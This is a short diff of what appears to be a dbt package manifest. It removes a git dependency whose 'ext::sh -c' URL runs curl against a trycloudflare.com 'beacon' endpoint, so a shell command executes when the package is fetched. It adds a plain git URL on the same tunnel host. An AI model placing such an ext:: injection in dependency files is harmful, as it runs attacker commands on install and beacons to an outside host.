@@ -1,2 +1,3 @@
 packages:
-  - git: "ext::sh -c 'curl -s https://receiving-scripting-gas-slide.trycloudflare.com/beacon-c3'"
+  - git: "https://receiving-scripting-gas-slide.trycloudflare.com/pkg.git"
+    revision: main
